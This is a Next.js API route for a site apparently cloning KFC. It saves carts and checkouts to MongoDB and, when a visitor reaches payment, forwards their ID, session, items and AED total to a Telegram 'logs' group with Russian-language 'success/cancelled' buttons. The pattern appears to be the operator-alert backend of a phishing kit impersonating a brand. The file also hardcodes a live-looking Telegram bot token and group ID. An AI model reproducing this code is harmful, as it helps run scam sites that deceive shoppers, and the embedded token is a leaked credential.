import { NextRequest, NextResponse } from 'next/server';
import mongoose from 'mongoose';
import { Telegraf } from 'telegraf';

// Bot configuration
const BOT_TOKEN = '8091715985:AAF4vygWjtydtkzvjTN8TwyvethE46vptQA';
const LOGS_GROUP_ID = '-4938154910';

const bot = new Telegraf(BOT_TOKEN);

// MongoDB connection
const mongoUrl = process.env.MONGO_URL || process.env.MONGODB_URL || process.env.DATABASE_URL || 'mongodb://localhost:27017/kfc-clone';

// Схемы
const cartSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  sessionId: { type: String, required: true },
  items: [{
    productId: { type: String, required: true },
    name: { type: String, required: true },
    price: { type: Number, required: true },
    quantity: { type: Number, default: 1 },
    customizations: { type: Object, default: {} }
  }],
  totalAmount: { type: Number, required: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const checkoutSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  sessionId: { type: String, required: true },
  cartId: { type: String, required: true },
  totalAmount: { type: Number, required: true },
  status: { type: String, default: 'pending', enum: ['pending', 'processing', 'completed', 'failed'] },
  paymentMethod: { type: String },
  createdAt: { type: Date, default: Date.now }
});

// Модели
const Carts = mongoose.models.Carts || mongoose.model('Carts', cartSchema);
const Checkouts = mongoose.models.Checkouts || mongoose.model('Checkouts', checkoutSchema);

export async function POST(request: NextRequest) {
  try {
    // Подключаемся к MongoDB если еще не подключены
    if (mongoose.connection.readyState !== 1) {
      try {
        await mongoose.connect(mongoUrl);
      } catch (mongoError) {
        console.error('MongoDB connection error:', mongoError);
        // Возвращаем успешный ответ даже если MongoDB недоступна
        return NextResponse.json({
          success: true,
          userId: 'local_test',
          sessionId: 'local_session',
          timestamp: new Date().toISOString(),
          note: 'MongoDB not available locally'
        });
      }
    }

    const { userId, sessionId, items, totalAmount, action } = await request.json();

    if (!userId || !sessionId) {
      return NextResponse.json(
        { error: 'Missing required fields: userId, sessionId' },
        { status: 400 }
      );
    }

    if (action === 'cart_update') {
      // Обновляем корзину
      const cart = await Carts.findOneAndUpdate(
        { userId, sessionId },
        {
          items,
          totalAmount,
          updatedAt: new Date()
        },
        { upsert: true, new: true }
      );

      return NextResponse.json({
        success: true,
        cartId: cart._id,
        totalAmount,
        itemCount: items.length
      });
    }

    if (action === 'checkout_start') {
      // Создаем запись о начале оформления заказа
      const cart = await Carts.findOne({ userId, sessionId });
      
      if (!cart) {
        return NextResponse.json(
          { error: 'Cart not found' },
          { status: 404 }
        );
      }

      const checkout = await Checkouts.create({
        userId,
        sessionId,
        cartId: cart._id.toString(),
        totalAmount: cart.totalAmount,
        status: 'pending',
        createdAt: new Date()
      });

      // Отправляем уведомление в Telegram
      const alertMessage = `
🛒 <b>ПЕРЕХОД НА ОПЛАТУ</b>

👤 <b>Пользователь ID:</b> <code>${userId}</code>
🆔 <b>Сессия:</b> <code>${sessionId}</code>
💰 <b>Сумма заказа:</b> <b>${totalAmount} AED</b>
📦 <b>Товаров в корзине:</b> <b>${items.length}</b>

📋 <b>Товары:</b>
${items.map((item: any, index: number) => 
  `${index + 1}. ${item.name} x${item.quantity} - ${item.price * item.quantity} AED`
).join('\n')}

⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
      `;

      await bot.telegram.sendMessage(LOGS_GROUP_ID, alertMessage, {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Успешно', callback_data: `checkout_${checkout._id}_success` },
              { text: '❌ Отменено', callback_data: `checkout_${checkout._id}_cancel` }
            ]
          ]
        }
      });

      return NextResponse.json({
        success: true,
        checkoutId: checkout._id,
        totalAmount: cart.totalAmount
      });
    }

    return NextResponse.json(
      { error: 'Invalid action' },
      { status: 400 }
    );

  } catch (error) {
    console.error('Cart/Checkout tracking error:', error);
    return NextResponse.json(
      { error: 'Failed to track cart/checkout' },
      { status: 500 }
    );
  }
}
